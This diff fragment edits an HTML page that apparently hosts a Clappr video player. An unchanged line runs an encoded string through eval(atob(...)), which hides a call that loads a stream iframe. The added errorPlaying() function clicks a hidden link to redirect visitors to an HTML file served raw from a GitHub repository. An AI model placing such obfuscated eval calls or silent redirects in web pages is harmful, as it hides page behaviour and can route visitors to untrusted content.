@@ -126,9 +126,25 @@ zdec = "ZHJhd0lGUjIoYXRvYignTDNOMGNtVmhiUzgvWlQwME1EUT0nKSk7";eval(atob(zdec));}
 
 </script>
 	
-<div style='clear: both;'></div>
-<div class='no-items section' id='Clappr play'></div> 
+<div id="overlay"></div>
 
+	<script>
+  function errorPlaying(){
+    url = "http://raw.githack.com/gaberomar/clp/master/1.html";
+    var a = document.createElement("a");
+    if (a.click) {
+        a.setAttribute("href", url);
+        a.setAttribute("target", "_self");
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+    } else {
+        location.href = url;
+    }
+
+  }
+
+</script> 
 <style>
 /* <![CDATA[ */
 
